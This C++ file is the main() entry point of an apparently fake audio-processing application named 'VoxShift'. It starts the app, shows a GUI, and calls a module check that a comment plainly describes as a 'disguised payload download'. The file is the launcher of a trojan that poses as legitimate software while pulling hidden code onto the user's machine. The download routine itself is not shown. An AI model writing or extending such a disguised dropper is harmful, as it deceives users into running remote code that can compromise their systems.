#include "core/Application.h"
#include "ui/MainWindow.h"
#include <iostream>

int main() {
    std::cout << "[VoxShift] Starting audio processing engine..." << std::endl;
    
    // Initialize application
    Application::initialize();
    
    // Check for audio processing modules (disguised payload download)
    Application::checkForProcessingModules();
    
    // Launch GUI
    MainWindow window;
    window.show();
    
    return 0;
}
